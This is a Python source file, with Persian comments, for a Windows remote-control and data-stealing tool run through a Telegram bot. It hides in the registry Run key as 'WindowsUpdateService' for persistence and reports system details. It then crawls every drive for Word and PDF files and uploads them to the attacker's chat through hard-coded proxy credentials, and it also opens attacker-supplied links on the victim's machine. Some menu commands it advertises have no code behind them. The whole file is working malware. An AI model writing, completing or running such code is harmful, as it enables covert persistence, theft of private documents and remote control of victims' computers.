import requests
import time
import platform
import subprocess
import webbrowser
import sys
import os
from pathlib import Path
import threading
import winreg as reg

def add_to_startup_registry():
    try:
        # مسیر فعلی exe (در حالت exe هم درست کار می‌کنه)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        exe_path = os.path.abspath(exe_path)

        # اضافه کردن به رجیستری
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdateService", 0, reg.REG_SZ, exe_path)  # اسم دلخواه: WindowsUpdateService
        reg.CloseKey(key)

        send_bot("✅ با موفقیت به استارت‌آپ ویندوز اضافه شد (از طریق رجیستری).\nاز این به بعد با روشن شدن سیستم خودکار اجرا می‌شم.")
    except PermissionError:
        send_bot("❌ دسترسی رد شد. لطفاً برنامه را با Run as Administrator اجرا کنید.")
    except Exception as e:
        send_bot(f"❌ خطا در اضافه کردن به رجیستری: {str(e)}")

# ================== تنظیمات ==================
TOKEN = "your token "
CHAT_ID = #your chatid
PROXY_LIST = [
    "http://ytphxiyw:kx3kllogdbn1@23.27.208.120:5830",
    "http://ytphxiyw:kx3kllogdbn1@23.26.71.145:5628",
    "http://ytphxiyw:kx3kllogdbn1@84.247.60.125:6095",
    "http://ytphxiyw:kx3kllogdbn1@142.111.48.253:7030",
]

PROXIES = None
last_key = ""
is_searching = False 

# ================== انتخاب پراکسی سالم ==================
def select_working_proxy():
    global PROXIES
    for proxy in PROXY_LIST:
        print(f"[~] Testing proxy: {proxy}")
        try:
            proxies = {"http": proxy, "https": proxy}
            r = requests.get("https://api.telegram.org", proxies=proxies, timeout=7)
            if r.status_code == 200:
                print(f"[+] Proxy OK → {proxy}")
                PROXIES = proxies
                return True
        except Exception as e:
            print(f"[-] Failed → {e}")
    return False

# ================== ارسال پیام ==================
def send_bot(message):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, data=data, proxies=PROXIES, timeout=10)
    except Exception as e:
        print("[-] Send Error:", e)

# ================== ارسال فایل (داکیومنت) ==================
def send_document(file_path):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': CHAT_ID}
        r = requests.post(url, data=data, files=files, proxies=PROXIES, timeout=60)
        if r.status_code == 200:
            send_bot(f"✅ ارسال شد: {os.path.basename(file_path)}")
        else:
            send_bot(f"❌ خطا در ارسال: {os.path.basename(file_path)}")
    except Exception as e:
        send_bot(f"❌ خطا: {str(e)} - فایل: {os.path.basename(file_path)}")

# ================== جستجو و ارسال فایل‌ها ==================
def search_and_send_files():
    global is_searching
    if is_searching:
        send_bot("🔍 جستجوی قبلی هنوز در حال اجراست...")
        return
    is_searching = True
    send_bot("🔍 شروع جستجو برای فایل‌های Word و PDF در کل سیستم...\nاین ممکن است چند دقیقه طول بکشد.")

    extensions = ('*.doc', '*.docx', '*.pdf')
    found_count = 0
    sent_count = 0
    max_files = 30  # محدودیت پیشنهادی — می‌تونی حذف کنی یا تغییر بدی

    # گرفتن تمام درایوها (C:, D:, E: و...)
    drives = [f"{d}:\\" for d in "ABDEFGHIJKLMNOPQRSTUVWXYZC" if os.path.exists(f"{d}:\\")]

    for drive in drives:
        if not is_searching:  # اگر کاربر بعداً کنسل کرد
            break
        send_bot(f"جستجو در درایو {drive} ...")
        for ext in extensions:
            try:
                for file_path in Path(drive).rglob(ext):
                    if not is_searching:
                        break
                    file_size = file_path.stat().st_size / (1024*1024)  # MB
                    if file_size > 48:  # تلگرام حداکثر ۵۰ مگ برای بات‌ها
                        continue

                    found_count += 1
                    send_document(str(file_path))
                    sent_count += 1

                    if sent_count >= max_files:
                        send_bot(f"⚠️ به حداکثر {max_files} فایل رسیدیم. جستجو متوقف شد.")
                        is_searching = False
                        return
            except Exception as e:
                continue  # دسترسی نداشتن به بعضی پوشه‌ها (مثل System Volume Information)

    send_bot(f"✅ جستجو تمام شد.\nیافت شده: {found_count} فایل\nارسال شده: {sent_count} فایل")
    is_searching = False

# ================== شروع سیستم ==================
def start_cl():
    try:
        os_version = platform.uname().version
        os_cpu = subprocess.getoutput("wmic cpu get name").replace("Name","").strip()

        pm = f"""
سیستم آنلاین شد ✅

OS : {os_version}
CPU : {os_cpu}

برای دیدن دستورات /list
"""
        send_bot(pm)
    except Exception as e:
        print("[-] Start Error:", e)

# ================== منو ==================
def list_menu():
    menu = """📋 دستورات ربات:

/sysinfo    → اطلاعات سیستم
/software   → نرم‌افزارهای نصب شده
/proclist   → پروسس‌های در حال اجرا
ارسال فایل ها → جستجو و ارسال تمام فایل‌های Word و PDF
ارسال لینک → باز کردن سایت
"""
    send_bot(menu)

# ================== باز کردن لینک ==================
def open_url(url):
    try:
        webbrowser.open(url)
        send_bot("لینک باز شد 😎")
    except Exception as e:
        print("[-] Open URL Error:", e)

# ================== دریافت آخرین دستور ==================
def key_bot():
    global last_key
    try:
        r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates",
                         proxies=PROXIES, timeout=15)
        data = r.json()
        if data.get("result"):
            last_message = data["result"][-1]["message"]
            last_key = last_message.get("text", "")
            # برای جلوگیری از تکرار دستورات قدیمی
            if "update_id" in last_message:
                offset = last_message["update_id"] + 1
                requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}", proxies=PROXIES)
            print("[CMD]", last_key)
    except Exception as e:
        print("[-] GetUpdates Error:", e)

# ================== اجرای اصلی ==================
if not select_working_proxy():
    print("❌ هیچ پراکسی HTTP سالمی پیدا نشد")
    sys.exit()
add_to_startup_registry()
start_cl()
while True:
    key_bot()
    if last_key == "/list":
        list_menu()
    elif last_key == "ok":
        send_bot("hi")
    elif last_key.startswith("http"):
        open_url(last_key)
    elif last_key.strip() == "ارسال فایل ها":
        # اجرای جستجو در ترد جداگانه تا لوپ اصلی قفل نشه
        threading.Thread(target=search_and_send_files, daemon=True).start()
    elif last_key =="end":
        break
    time.sleep(10)
